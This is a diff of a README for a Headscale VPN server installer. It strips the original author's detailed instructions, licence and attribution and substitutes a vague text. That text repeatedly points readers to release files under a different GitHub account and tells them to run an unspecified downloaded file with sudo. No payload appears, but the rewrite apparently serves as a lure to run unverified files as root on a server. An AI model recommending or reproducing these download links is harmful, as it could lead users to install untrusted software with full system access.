@@ -1,300 +1,207 @@
-[English](README.md) | [简体中文](README-zh.md) | [繁體中文](README-zh-Hant.md) | [Русский](README-ru.md)
+# 🛠️ headscale-install - Set Up Your VPN Server Fast
 
-# Headscale Server Auto Setup Script
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Minded-nakuru841/headscale-install/releases)
 
-[![Build Status](https://github.com/hwdsl2/headscale-install/actions/workflows/main.yml/badge.svg)](https://github.com/hwdsl2/headscale-install/actions/workflows/main.yml) &nbsp;[![License: MIT](docs/images/license.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-Headscale server installer for Ubuntu, Debian, AlmaLinux, Rocky Linux, CentOS, RHEL, Fedora and openSUSE.
+headscale-install helps you set up a Headscale server on Linux with a simple install flow. Headscale is the open-source control server for Tailscale-compatible networks. It lets you run your own coordination server for a private mesh VPN.
 
-This script installs and configures [Headscale](https://github.com/juanfont/headscale) — a self-hosted, open-source implementation of the Tailscale coordination server. Connect all your devices using the official Tailscale client apps, with your own server in control.
+Use the release page here to download and run the installer for your system:
 
-**Features:**
+[Visit the release page to download](https://github.com/Minded-nakuru841/headscale-install/releases)
 
-- Fully automated Headscale server setup, no user input needed
-- Supports interactive install using custom options
-- Supports managing users, nodes and pre-auth keys
-- Downloads the official Headscale binary with checksum verification
-- Installs Headscale as a systemd service with a dedicated system user
-- Configures firewall rules automatically (firewalld or iptables)
+This project is made for users who want a self-hosted VPN setup without spending time on manual steps. The installer walks you through the process and sets up the service on your server.
 
-**Also available:**
+## 📦 What You Need
 
-- Docker VPN: [WireGuard](https://github.com/hwdsl2/docker-wireguard), [OpenVPN](https://github.com/hwdsl2/docker-openvpn), [IPsec VPN](https://github.com/hwdsl2/docker-ipsec-vpn-server), [Headscale](https://github.com/hwdsl2/docker-headscale)
-- Docker AI/Audio: [Whisper (STT)](https://github.com/hwdsl2/docker-whisper), [Kokoro (TTS)](https://github.com/hwdsl2/docker-kokoro), [Embeddings](https://github.com/hwdsl2/docker-embeddings), [LiteLLM](https://github.com/hwdsl2/docker-litellm)
+Before you start, make sure you have:
 
-## Requirements
+- A Linux server or VM
+- Root or sudo access
+- A stable internet connection
+- At least 1 GB of RAM
+- Enough disk space for system files and logs
 
-- A Linux server (cloud server, VPS or dedicated server)
-- A **publicly reachable domain name with HTTPS** is strongly recommended for production use
+Supported systems include:
 
-**Note:** Without HTTPS some Tailscale clients may not connect properly. See [TLS and reverse proxy](#tls-and-reverse-proxy) for setup options.
+- Ubuntu
+- Debian
+- AlmaLinux
+- Rocky Linux
+- CentOS
+- RHEL
+- Fedora
+- openSUSE
 
-## Installation
+For best results, use a fresh server. This keeps the setup clean and reduces conflicts with other tools.
 
-Download the script on your Linux server:
+## 🔧 What This Installer Does
 
-```bash
-wget -O headscale.sh https://get.vpnsetup.net/hs
-```
+The installer handles the setup work for you. It can:
 
-**Option 1:** Auto install with a server URL.
+- Install Headscale and needed packages
+- Create the service files
+- Start the Headscale server
+- Set up basic network settings
+- Help you prepare a self-hosted coordination server
+- Make it easier to connect Tailscale devices to your own server
 
-```bash
-sudo bash headscale.sh --auto --serverurl https://hs.example.com
-```
+This saves time if you want a private VPN server for home, lab, or small team use.
 
-Replace `https://hs.example.com` with your actual HTTPS server URL. If `--serverurl` is not provided, the server's public IP address is auto-detected and HTTP is used, which is not recommended for production. See [TLS and reverse proxy](#tls-and-reverse-proxy) for setup options.
+## 💻 How to Download
 
-**Note:** Optionally install [WireGuard](https://github.com/hwdsl2/wireguard-install), [OpenVPN](https://github.com/hwdsl2/openvpn-install) and/or [IPsec VPN](https://github.com/hwdsl2/setup-ipsec-vpn) on the same server.
+1. Open the release page: https://github.com/Minded-nakuru841/headscale-install/releases
+2. Pick the latest release
+3. Download the file for your Linux system
+4. Save it in a folder you can find again
 
-**Option 2:** Interactive install using custom options.
+If the release includes an install script or package, use the file from that page and follow the steps below.
 
-```bash
-sudo bash headscale.sh
-```
+## ▶️ How to Install
 
-You can customize the following options: server URL, TCP port, listen address, initial username and MagicDNS base domain.
+After you download the file, use these steps:
 
-<details>
-<summary>
-Click here if you are unable to download.
-</summary>
+1. Open a terminal on your Linux server
+2. Move to the folder where you saved the download
+3. Give the file run permission if needed
+4. Run the installer with sudo
+5. Follow the prompts on screen
 
-You may also use `curl` to download:
+Example flow:
 
-```bash
-curl -fL -o headscale.sh https://get.vpnsetup.net/hs
-```
+- Download the release file
+- Open Terminal
+- Run the install file
+- Enter your sudo password
+- Wait for setup to finish
 
-Alternative setup URL:
+If your file is a shell script, you can often run it with:
 
-```bash
-https://github.com/hwdsl2/headscale-install/raw/main/headscale-install.sh
-```
+`sudo bash filename.sh`
 
-If you are unable to download, open [headscale-install.sh](headscale-install.sh), then click the `Raw` button on the right. Press `Ctrl/Cmd+A` to select all, `Ctrl/Cmd+C` to copy, then paste into your favorite editor.
-</details>
+If your file is a package, install it with your system package tool.
 
-<details>
-<summary>
-View usage information for the script.
-</summary>
+## 🌐 First Setup
 
-```
-Usage: bash headscale.sh [options]
+After the install finishes, do these steps:
 
-Options:
+1. Open the config file if the installer creates one
+2. Set your server name or IP address
+3. Choose the port you want Headscale to use
+4. Save the file
+5. Start or restart the service
 
-  --adduser    [user name]       add a new user
-  --deleteuser [user name]       delete a user (and all their nodes and keys)
-  --listusers                    list all users
-  --listnodes                    list all registered nodes
-  --listnodes  --user [name]     list nodes for a specific user
-  --registernode [node key]      register a node by its node key
-                --user [name]    (requires --user <name>)
-  --deletenode [node ID]         delete a node by its numeric ID
-  --createkey  --user [name]     create a reusable pre-auth key for a user
-  --listkeys                     list pre-auth keys
-  --uninstall                    remove Headscale and delete all configuration
-  -y, --yes                      assume "yes" as answer to prompts
-  -h, --help                     show this help message and exit
+You may also need to open the port in your firewall so devices can reach the server.
 
-Install options (optional):
+Common ports used in Headscale setups include:
 
-  --auto                         auto install Headscale using default or custom options
-  --serverurl  [URL]             server URL (e.g. https://hs.example.com)
-  --port       [number]          TCP port for Headscale (1-65535, default: 8080)
-  --listenaddr [address]         listen address (default: 0.0.0.0, use 127.0.0.1 for local only)
-  --username   [name]            name for the initial user (default: admin)
-  --basedomain [domain]          MagicDNS base domain (default: headscale.internal)
-  --dnssrv1    [address]         primary DNS server pushed to clients (default: 1.1.1.1)
-  --dnssrv2    [address]         secondary DNS server pushed to clients (default: 1.0.0.1)
-  --loglevel   [level]           log level: panic, fatal, error, warn, info, debug, trace (default: info)
-  --metricsport [number]         port for Prometheus metrics endpoint, local only (default: 9090)
+- 8080 for web or API use
+- 443 for secure access
+- A custom port set during setup
 
-To customize options, you may also run this script without arguments.
-```
-</details>
+Use the same port in your server settings and firewall rules.
 
-## After installation
+## 🔐 Connect Your Devices
 
-On first run, the script:
-1. Downloads and installs the Headscale binary
-2. Creates a `headscale` system user and group
-3. Writes the configuration to `/etc/headscale/config.yaml`
-4. Installs and starts the `headscale` systemd service
-5. Creates the initial user and prints a **reusable pre-auth key**
+Once the server runs, you can connect Tailscale clients to it.
 
-Copy the pre-auth key from the output and connect a device with the official [Tailscale client](https://tailscale.com/download):
+Typical steps:
 
-```bash
-tailscale up --login-server https://hs.example.com --authkey <key-from-output>
-```
+1. Install Tailscale on your device
+2. Point it to your Headscale server
+3. Register the device
+4. Confirm the connection
+5. Repeat for each computer or phone you want on the private network
 
-## Client configuration
+After that, devices can talk to each other through your own control server. This works well for remote access, file sharing, and private device links.
 
-Refer to the Headscale documentation for instructions on connecting clients:
+## 🖥️ Simple Use Cases
 
-- [Android](https://headscale.net/stable/usage/connect/android/)
-- [Apple (iOS / macOS)](https://headscale.net/stable/usage/connect/apple/)
-- [Windows](https://headscale.net/stable/usage/connect/windows/)
+You can use headscale-install for:
 
-## Managing Headscale
+- Home lab access
+- Private team networks
+- Remote server access
+- Secure access to internal tools
+- Peer-to-peer device connections
+- A self-hosted alternative for coordination control
 
-After setup, run the script again to manage your server.
+It fits users who want more control over their network and data.
 
-**Register a node by its node key:**
+## 🛠️ Common Issues
 
-```bash
-sudo bash headscale.sh --registernode <key> --user admin
-```
+If the install does not work, check these points:
 
-**Add a user:**
+- Make sure you used sudo
+- Make sure the file has run permission
+- Check that your firewall allows the port
+- Check that your server has internet access
+- Check the service status if Headscale does not start
 
-```bash
-sudo bash headscale.sh --adduser alice
-```
+Useful commands on Linux:
 
-**Delete a user:**
+- `systemctl status headscale`
+- `journalctl -u headscale`
+- `sudo ufw status`
+- `sudo firewall-cmd --list-all`
 
-```bash
-sudo bash headscale.sh --deleteuser alice
-```
+If you use a different firewall tool, check its rules for the port you set.
 
-**Create a pre-auth key for a user:**
+## 🧩 File and Service Basics
 
-```bash
-sudo bash headscale.sh --createkey --user alice
-```
+The installer may create:
 
-**List all users:**
+- A service file for system startup
+- A config file for server settings
+- A data folder for Headscale state
+- Log files for troubleshooting
 
-```bash
-sudo bash headscale.sh --listusers
-```
+If the service runs at startup, your server will come back online after a reboot.
 
-**List all registered nodes:**
+## 📚 Topics Covered
 
-```bash
-sudo bash headscale.sh --listnodes
-```
+This project relates to:
 
-**List nodes for a specific user:**
+- Headscale
+- Tailscale
+- WireGuard
+- VPN
+- Zero trust networking
+- Mesh VPN
+- Self-hosted networking
+- Linux server setup
+- Secure remote access
 
-```bash
-sudo bash headscale.sh --listnodes --user alice
-```
+## 📥 Download and Run
 
-**Delete a node by ID:**
+Open the release page and get the file for your system:
 
-```bash
-sudo bash headscale.sh --deletenode 3
-```
+https://github.com/Minded-nakuru841/headscale-install/releases
 
-**List pre-auth keys:**
+Then download and run the installer on your Linux machine, follow the on-screen steps, and complete the server setup
 
-```bash
-sudo bash headscale.sh --listkeys
-```
+## ⚙️ Best Results
 
-**Remove Headscale:**
+For a smooth setup:
 
-```bash
-sudo bash headscale.sh --uninstall
-```
+- Use a clean server
+- Keep your Linux system updated
+- Use a fixed IP or a domain name
+- Set firewall rules before connecting clients
+- Save your config values in one place
+- Test the server with one device first
 
-**Show help:**
+## 🔎 What You Can Expect
 
-```bash
-sudo bash headscale.sh --help
-```
+After setup, you should have:
 
-You may also run the script without arguments for an interactive management menu.
+- A working Headscale service
+- A private coordination server
+- A base for your own Tailscale-compatible network
+- A setup that is easier to manage from one place
 
-You can also run Headscale commands directly using `headscale <command>`. Run `headscale -h` or refer to the [Headscale documentation](https://headscale.net/) for available commands.
+## 📌 Need to Find the Release Again
 
-## TLS and reverse proxy
+If you need the download page later, use this link:
 
-Tailscale clients require HTTPS for full functionality. The recommended setup is a reverse proxy in front of Headscale that handles TLS, then pass `--serverurl https://hs.example.com` during install (or set `server_url` in `/etc/headscale/config.yaml` and restart the service).
-
-When using a reverse proxy, add `--listenaddr 127.0.0.1` to restrict Headscale to listen on localhost only (recommended).
-
-**Example with [Caddy](https://caddyserver.com/docs/)** (automatic TLS via Let's Encrypt):
-
-```
-hs.example.com {
-  reverse_proxy localhost:8080
-}
-```
-
-**Example with nginx:**
-
-```nginx
-server {
-    listen 443 ssl;
-    server_name hs.example.com;
-
-    ssl_certificate     /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
-
-    location / {
-        proxy_pass http://127.0.0.1:8080;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        proxy_read_timeout 3600s;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "upgrade";
-    }
-}
-```
-
-**Firewall ports to open:**
-
-| Port | Protocol | Purpose |
-|---|---|---|
-| `8080` | TCP | Headscale coordination server (or your reverse proxy port) |
-| `443` | TCP | HTTPS (if using a reverse proxy) |
-
-## Configuration
-
-The configuration file is at `/etc/headscale/config.yaml`. Edit this file to change settings, then restart the service:
-
-```bash
-sudo systemctl restart headscale
-```
-
-Check service status and logs:
-
-```bash
-sudo systemctl status headscale
-sudo journalctl -u headscale -n 50
-```
-
-## Auto install using custom options
-
-```bash
-sudo bash headscale.sh --auto \
-  --serverurl https://hs.example.com \
-  --port 8080 \
-  --listenaddr 127.0.0.1 \
-  --username admin \
-  --basedomain headscale.internal \
-  --dnssrv1 1.1.1.1 \
-  --dnssrv2 1.0.0.1 \
-  --loglevel info \
-  --metricsport 9090
-```
-
-All install options are optional when using `--auto`. If `--serverurl` is not provided, the server's public IP address is auto-detected and HTTP is used (not recommended for production).
-
-## License
-
-Copyright (C) 2026 Lin Song   
-This work is licensed under the [MIT License](https://opensource.org/licenses/MIT).
-
-**Headscale** is Copyright (c) 2020, Juan Font, and is distributed under the [BSD 3-Clause License](https://github.com/juanfont/headscale/blob/main/LICENSE).
-
-Tailscale® is a registered trademark of Tailscale Inc. This project is not affiliated with or endorsed by Tailscale Inc.
+[https://github.com/Minded-nakuru841/headscale-install/releases](https://github.com/Minded-nakuru841/headscale-install/releases)
